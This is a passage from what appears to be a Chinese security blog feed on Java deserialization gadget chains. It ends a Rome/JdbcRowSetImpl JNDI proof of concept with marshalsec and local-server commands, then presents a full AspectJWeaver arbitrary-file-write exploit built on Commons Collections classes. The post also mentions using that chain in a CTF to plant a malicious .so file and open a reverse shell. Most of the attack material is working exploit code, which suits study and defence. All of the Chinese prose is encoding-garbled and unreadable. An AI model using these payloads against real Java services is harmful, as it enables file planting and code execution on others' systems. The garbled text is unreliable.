class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        setFieldValue(badAttributeValueExpException, <span class="hljs-string">&quot;val&quot;</span>, bean);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#calc 8099</code>å¼€ldapï¼Œ</p><p><code>python -m http.server 8000</code>å¼€å¯webæœåŠ¡ï¼Œç„¶åå°±å’Œä¹‹å‰è®²çš„JNDIä¸€æ ·äº†ã€‚</p><p>Romeè¿˜æœ‰å¾ˆå¤šå˜åŒ–é“¾ï¼Œä¹Ÿéå¸¸å€¼å¾—æ€è€ƒï¼Œå¯ä»¥çœ‹ä¸‹æ–¹é“¾æ¥ç»§ç»­è·Ÿè¿›å­¦ä¹ ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/rome#id-0x02-first-glance">Rome | Java (gitbook.io)</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136576748?ops_request_misc=%7B%22request_id%22:%22172330093116800211577942%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172330093116800211577942&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-136576748-null-null.nonecase&utm_term=ROME">ã€Webã€‘æµ…èŠJavaååºåˆ—åŒ–ä¹‹Romeâ€”â€”EqualsBean&amp;ObjectBean_javaååºåˆ—åŒ–romeé“¾-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136589322?ops_request_misc=%7B%22request_id%22:%22172330093116800211577942%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172330093116800211577942&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-136589322-null-null.nonecase&utm_term=ROME">ã€Webã€‘æµ…èŠJavaååºåˆ—åŒ–ä¹‹Romeâ€”â€”å…³äºå…¶ä»–åˆ©ç”¨é“¾_javaååºåˆ—åŒ–romeé“¾-CSDNåšå®¢</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AspectJWeaver</title>
    <link href="/2024/08/09/AspectJWeaver/"/>
    <url>/2024/08/09/AspectJWeaver/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¾ç¨€è®°å¾—å›½èµ›åˆèµ›çš„é‚£é“Javaé¢˜ç›®å°±æ˜¯ç”¨<code>AspectJWeaver</code>å†™å…¥æ¶æ„soæ–‡ä»¶ä¼ è¿›å»ï¼Œç„¶åload_extensionä¸€æ‰‹åå¼¹shellã€‚</p><p>å…¶å®ç”¨åˆ°çš„å°±æ˜¯<code>AspectJWeaver</code>çš„ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ã€‚</p><p><code>AspectJWeaver</code>è¿ç”¨åœ¨é¢å‘åˆ‡é¢ç¼–ç¨‹(AOP: Aspect Oriented Programming)ä¸­</p><p>AOPæ˜¯ä¸€ç§ç¼–ç¨‹èŒƒå¼ï¼Œæ—¨åœ¨æé«˜æ¨¡å—åŒ–ã€é™ä½ä»£ç è€¦åˆåº¦ã€‚å®ƒå¯ä»¥å‘ç°æœ‰ä»£ç æ·»åŠ å…¶ä»–è¡Œä¸ºè€Œä¸ä¿®æ”¹ä»£ç æœ¬èº«ã€‚Springå°±è¿ç”¨åˆ°äº†AOP</p><p>AOPçš„ä¸€äº›æ¦‚å¿µï¼š</p><ul><li>åˆ‡é¢(Aspect): å…¬å…±åŠŸèƒ½çš„å®ç°ã€‚å¦‚æ—¥å¿—åˆ‡é¢ã€æƒé™åˆ‡é¢ã€éªŒç­¾åˆ‡é¢ã€‚ç»™Javaç±»ä½¿ç”¨<code>@Aspect</code>æ³¨é‡Šä¿®é¥°ï¼Œå°±èƒ½è¢«AOPå®¹å™¨è¯†åˆ«ä¸ºåˆ‡é¢</li><li>é€šçŸ¥(Advice): åˆ‡é¢çš„å…·ä½“å®ç°ï¼Œå³åˆ‡é¢ç±»ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œæ ¹æ®æ”¾ç½®çš„åœ°æ–¹ä¸åŒï¼Œå¯åˆ†ä¸ºå‰ç½®é€šçŸ¥ï¼ˆBeforeï¼‰ã€åç½®é€šçŸ¥ï¼ˆAfterReturningï¼‰ã€å¼‚å¸¸é€šçŸ¥ï¼ˆAfterThrowingï¼‰ã€æœ€ç»ˆé€šçŸ¥ï¼ˆAfterï¼‰ä¸ç¯ç»•é€šçŸ¥ï¼ˆAroundï¼‰</li><li>è¿æ¥ç‚¹(JoinPoint): ç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­èƒ½å¤Ÿæ’å…¥åˆ‡é¢çš„åœ°æ–¹ã€‚Springåªæ”¯æŒæ–¹æ³•çº§çš„è¿æ¥ç‚¹ã€‚æ¯”å¦‚ä¸€ä¸ªç›®æ ‡å¯¹è±¡æœ‰5ä¸ªæ–¹æ³•ï¼Œå°±æœ‰5ä¸ªè¿æ¥ç‚¹</li><li>åˆ‡å…¥ç‚¹(PointCut): ç”¨äºå®šä¹‰é€šçŸ¥åº”è¯¥åˆ‡å…¥åˆ°å“ªäº›è¿æ¥ç‚¹</li><li>ç›®æ ‡å¯¹è±¡(Target): å³å°†åˆ‡å…¥åˆ‡é¢çš„å¯¹è±¡ï¼Œè¢«é€šçŸ¥çš„å¯¹è±¡</li><li>ä»£ç†å¯¹è±¡(Proxy): å°†é€šçŸ¥åº”ç”¨åˆ°ç›®æ ‡å¯¹è±¡ä¹‹åè¢«åŠ¨æ€åˆ›å»ºçš„å¯¹è±¡ï¼Œå¯ä»¥ç®€å•åœ°ç†è§£ä¸ºï¼Œä»£ç†å¯¹è±¡çš„åŠŸèƒ½ç­‰äºç›®æ ‡å¯¹è±¡æœ¬èº«ä¸šåŠ¡é€»è¾‘åŠ ä¸Šå…±æœ‰åŠŸèƒ½ã€‚ä»£ç†å¯¹è±¡å¯¹äºä½¿ç”¨è€…è€Œè¨€æ˜¯é€æ˜çš„ï¼Œæ˜¯ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­çš„äº§ç‰©ã€‚ç›®æ ‡å¯¹è±¡è¢«ç»‡å…¥å…¬å…±åŠŸèƒ½åäº§ç”Ÿçš„å¯¹è±¡ã€‚</li><li>ç»‡å…¥(Weaving): å°†åˆ‡é¢åº”ç”¨åˆ°ç›®æ ‡å¯¹è±¡ä»è€Œåˆ›å»ºä¸€ä¸ªæ–°çš„ä»£ç†å¯¹è±¡çš„è¿‡ç¨‹ã€‚è¿™ä¸ªè¿‡ç¨‹å¯ä»¥å‘ç”Ÿåœ¨ç¼–è¯‘æ—¶ã€ç±»åŠ è½½æ—¶ã€è¿è¡Œæ—¶ã€‚Springæ˜¯åœ¨è¿è¡Œæ—¶å®Œæˆç»‡å…¥ï¼Œè¿è¡Œæ—¶ç»‡å…¥é€šè¿‡Javaè¯­è¨€çš„åå°„æœºåˆ¶ä¸åŠ¨æ€ä»£ç†æœºåˆ¶æ¥åŠ¨æ€å®ç°ã€‚</li></ul><p>å¤§æ¦‚äº†è§£ä¸€ä¸‹ï¼Œè·Ÿä¸‹é¢è®²çš„åˆ©ç”¨é“¾æ²¡å•¥å…³ç³»</p><h2 id="ä»»æ„æ–‡ä»¶å†™å…¥"><a href="#ä»»æ„æ–‡ä»¶å†™å…¥" class="headerlink" title="ä»»æ„æ–‡ä»¶å†™å…¥"></a>ä»»æ„æ–‡ä»¶å†™å…¥</h2><p>è¿™ä¸ªåˆ©ç”¨é“¾ç”¨åˆ°äº†CCä¾èµ–ã€‚å›å¿†ä¸€ä¸‹ï¼ŒCommons Collections 3.2.2ä¸­ å¢åŠ äº†â¼€ä¸ªâ½…æ³•<code>FunctorUtils#checkUnsafeSerialization</code> â½¤äºæ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ï¼Œå…¶ä¼šæ£€æŸ¥å¸¸è§çš„å±é™©Transformerç±»ï¼Œå½“æˆ‘ä»¬ååºåˆ—åŒ–åŒ…å«è¿™äº›å¯¹è±¡æ—¶å°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><p><code>AspectJWeaver</code>è¿™é‡Œåªç”¨åˆ°äº†CCé‡Œçš„<code>LazyMap</code>ã€<code>TiedMapEntry</code>ã€<code>ConstantTransformer</code>ï¼Œé«˜ç‰ˆæœ¬CCä»å…·æœ‰å®ç”¨æ€§ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjweaver<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;AspectWrite.txt&quot;</span>;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (Map) constructor.newInstance(path, <span class="hljs-number">2</span>);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;content to write&quot;</span>.getBytes(StandardCharsets.UTF_8));<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, fileName);<br><br>        HashSet&lt;Object&gt; hs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;(<span class="hljs-number">1</span>);<br>        hs.add(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        setPut(hs, entry);<br>        ser(hs);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        objectOutputStream.writeObject(o);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;E:/ser&quot;</span>);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>        outputStream.write(baos.toByteArray());<br>        outputStream.close();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] fileBytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:/ser&quot;</span>));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(fileBytes));<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPut</span><span class="hljs-params">(HashSet&lt;Object&gt; hs, Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// è·å–HashSetä¸­çš„HashMapå¯¹è±¡</span><br>        Field field;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            field = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;backingMap&quot;</span>);<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> (HashMap) field.get(hs);<br><br>        <span class="hljs-comment">// è·å–HashMapä¸­çš„tableå¯¹è±¡</span><br>        Field field1;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field1 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            field1 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;elementData&quot;</span>);<br>        &#125;<br>        field1.setAccessible(<span class="hljs-literal">true</span>);<br>        Object[] array = (Object[]) field1.get(innerMap);<br><br>        <span class="hljs-comment">// ä»tableå¯¹è±¡ä¸­è·å–ç´¢å¼•0 æˆ– 1çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸ºHashMap$Nodeç±»</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> array[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">null</span>) &#123;<br>            node = array[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        <span class="hljs-comment">// ä»HashMap$Nodeç±»ä¸­è·å–keyè¿™ä¸ªfieldï¼Œå¹¶ä¿®æ”¹ä¸ºtiedMapEntry</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">keyField</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<br>        keyField.setAccessible(<span class="hljs-literal">true</span>);<br>        keyField.set(node, o);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>GadGet</code>:</p><blockquote><p>HashSet#readObject</p><p>-&gt; HashMap#put(tiedMapEntry, new Object())</p><p>-&gt; HashMap#hash(tiedMapEntry)</p><p>-&gt; TiedMapEntry#hashCode</p><p>-&gt; TiedMapEntry#getValue</p><p>-&gt; LazyMap#get</p><p>-&gt; SimpleCache$StorableCachingMap#put</p><p>-&gt; SimpleCache$StorableCachingMap#writeToPath</p><p>-&gt; FileOutputStream#write()</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>é¡¾åæ€ä¹‰çš„è§’åº¦ï¼Œæ¨æµ‹<code>StoreableCachingMap&quot;</code>å¯èƒ½æ˜¯ä¸€ä¸ªå¯¹å¯¹è±¡è¿›è¡Œå­˜å‚¨å’Œç¼“å­˜çš„æ˜ å°„ç»“æ„çš„åç§°ã€‚</p><p>å®ƒå¯èƒ½å®ç°äº†ä¸€ç§å°†å¯¹è±¡å­˜å‚¨åœ¨å†…éƒ¨æ•°æ®ç»“æ„ä¸­ï¼Œå¹¶ä½¿ç”¨æŸç§ç­–ç•¥ï¼ˆä¾‹å¦‚æ—¶é—´æˆ³ã€æœ€è¿‘æœ€å°‘ä½¿ç”¨ç­‰ï¼‰è¿›è¡Œç¼“å­˜ç®¡ç†çš„æ–¹å¼ã€‚</p><p>æ³¨æ„åˆ°<code>SimpleCache</code>ç±»çš„å†…éƒ¨ç±»<code>StoreableCachingMap</code>æ˜¯ä¸€ä¸ªç»§æ‰¿<code>HashMap</code>çš„ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StoreableCachingMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HashMap</span> &#123;<br>        <span class="hljs-keyword">private</span> String folder;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CACHENAMEIDX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cache.idx&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">lastStored</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEF_STORING_TIMER</span> <span class="hljs-operator">=</span> <span class="hljs-number">60000</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> storingTimer;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Trace trace;<br></code></pre></td></tr></table></figure><p>å…¶æ„é€ æ–¹æ³•åœ¨åˆ›å»ºå¯¹è±¡æ—¶æ¥æ”¶æ–‡ä»¶å¤¹è·¯å¾„å’Œå­˜å‚¨è®¡æ—¶å™¨çš„å€¼ï¼Œå¹¶å°†å®ƒä»¬ä¿å­˜åˆ°å¯¹è±¡çš„çŠ¶æ€ä¸­ï¼ŒåŒæ—¶è°ƒç”¨äº†ä¸€ä¸ªåˆå§‹åŒ–æ–¹æ³•æ¥ç¡®ä¿å¯¹è±¡çš„æ­£ç¡®è®¾ç½®ã€‚</p><p><code>StoreableCachingMap</code>æ˜¯<code>HashMap</code>çš„å­ç±»ï¼Œé‡å†™äº†<code>put</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">StoreableCachingMap</span><span class="hljs-params">(String folder, <span class="hljs-type">int</span> storingTimer)</span>&#123;<br>    <span class="hljs-built_in">this</span>.folder = folder;<br>    initTrace();<br>    <span class="hljs-built_in">this</span>.storingTimer = storingTimer;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] valueBytes = (<span class="hljs-type">byte</span>[]) value;<br><br>        <span class="hljs-keyword">if</span> (Arrays.equals(valueBytes, SAME_BYTES)) &#123;<br>            path = SAME_BYTES_STRING;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            path = writeToPath((String) key, valueBytes);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.put(key, path);<br>        storeMap();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<span class="hljs-comment">//...</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">writeToPath</span><span class="hljs-params">(String key, <span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">fullPath</span> <span class="hljs-operator">=</span> folder + File.separator + key;<br>    <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(fullPath);<br>    fos.write(bytes);<br>    fos.flush();<br>    fos.close();<br>    <span class="hljs-keyword">return</span> fullPath;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯å°†é”®å€¼å¯¹æ·»åŠ åˆ°æ˜ å°„ä¸­ã€‚æ ¹æ® value çš„ä¸åŒæƒ…å†µï¼Œå¯èƒ½ä¼šå°†è·¯å¾„è®¾ç½®ä¸ºSAME_BYTES_STRING æˆ–ä½¿ç”¨ writeToPath æ–¹æ³•å°†é”®å’Œå€¼å†™å…¥åˆ°æŸä¸ªè·¯å¾„ä¸­ã€‚ç„¶åï¼Œå°†é”®å’Œè·¯å¾„æ·»åŠ åˆ°æ˜ å°„ä¸­ï¼Œå¹¶å°†æ˜ å°„æ•°æ®å­˜å‚¨åˆ°æŒä¹…åŒ–å­˜å‚¨ä¸­ã€‚æœ€åï¼Œè¿”å›æ·»åŠ ç»“æœã€‚ </p><p>é‚£ä¸ªæ¡ä»¶åˆ¤æ–­å°±æ˜¯æ£€æŸ¥ valueBytes æ˜¯å¦ä¸ SimpleCache.SAME_BYTES ç›¸ç­‰ã€‚å¦‚æœç›¸ç­‰ï¼Œè¯´æ˜ value 